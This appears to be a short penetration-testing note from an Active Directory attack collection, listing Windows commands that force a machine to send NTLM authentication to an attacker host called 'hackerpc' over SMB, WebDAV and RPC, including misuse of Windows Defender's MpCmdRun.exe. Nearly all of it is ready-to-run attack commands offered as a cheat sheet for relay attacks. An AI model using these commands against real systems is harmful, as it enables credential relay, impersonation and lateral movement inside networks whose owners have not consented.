---
title: NTLM Relay from Command Execution
---

[[notes/ad/ntlm-relay-source|Coerce NTLM authentication]] by executing a command.

Over SMB.

~~~ bat
dir \\hackerpc\share\
type \\hackerpc\share\test.txt
"C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2008.9-0\MpCmdRun.exe" -Scan -ScanType 3 -File \\hackerpc\share\test.txt
"C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2008.9-0\MpCmdRun.exe" -DownloadFile -Url https://example.com -Path \\hackerpc\share\
~~~

Over HTTP with WebDAV.

~~~ bat
dir \\hackerpc@8080\DavWWWRoot\
dir \\hackerpc@SSL@443\DavWWWRoot\
net use \\hackerpc@80\share
net use https://hackerpc/share
~~~

Over RPC.

~~~ bat
rpcping.exe /s %lhost% /e 9997 /a connect /u NTLM
~~~
